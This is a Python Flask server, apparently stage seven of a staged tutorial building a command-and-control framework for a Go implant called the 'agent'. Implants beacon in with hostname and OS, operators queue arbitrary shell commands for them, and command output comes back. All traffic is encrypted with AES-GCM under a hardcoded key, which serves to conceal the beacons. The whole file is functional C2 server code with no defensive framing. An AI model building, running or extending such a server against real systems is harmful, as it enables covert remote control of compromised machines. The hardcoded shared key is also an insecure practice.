"""
SERVER — Stage 07 (AES-GCM Encryption)

Matches: agent/stages/stage07_with_encryption.go

What this adds:
- All beacon traffic is AES-256-GCM encrypted
- Server decrypts incoming payload, encrypts response
- Shared key: "01234567890123456789012345678901" (32 bytes)
"""

import base64, json, os
from flask import Flask, request, jsonify
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from datetime import datetime

app = Flask(__name__)

# ── Crypto ─────────────────────────────────────────────────────

SECRET_KEY = b"01234567890123456789012345678901"   # 32 bytes

def encrypt(data: dict) -> str:
    aes   = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)
    ct    = aes.encrypt(nonce, json.dumps(data).encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt(enc: str) -> dict:
    raw        = base64.b64decode(enc)
    nonce, ct  = raw[:12], raw[12:]
    aes        = AESGCM(SECRET_KEY)
    return json.loads(aes.decrypt(nonce, ct, None).decode())

# ── State ──────────────────────────────────────────────────────

agents  = {}
tasks   = {}
results = {}

# ── Routes ─────────────────────────────────────────────────────

@app.route("/beacon", methods=["POST"])
def beacon():
    payload  = decrypt(request.json["data"])
    agent_id = payload.get("agent", "unknown")

    agents[agent_id] = {
        "hostname":  payload.get("hostname", "?"),
        "os":        payload.get("os", "?"),
        "status":    payload.get("status", "unknown"),
        "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    if payload.get("output"):
        results[agent_id] = payload["output"]
        print(f"\n[OUTPUT from {agent_id}]\n{payload['output']}\n{'='*40}")

    task = tasks.pop(agent_id, None)
    return jsonify({"data": encrypt({"task": task or ""})})

@app.route("/command", methods=["POST"])
def queue_command():
    data     = request.get_json()
    agent_id = data.get("agent")
    cmd      = data.get("cmd")
    if not agent_id or not cmd:
        return jsonify({"error": "agent and cmd required"}), 400
    tasks[agent_id] = cmd
    print(f"[*] Task queued for {agent_id}: {cmd}")
    return jsonify({"queued": True})

@app.route("/agents")
def list_agents():
    return jsonify(agents)

if __name__ == "__main__":
    print("[*] Stage 07 server started — AES-GCM encryption enabled")
    app.run(host="0.0.0.0", port=8080, debug=False)
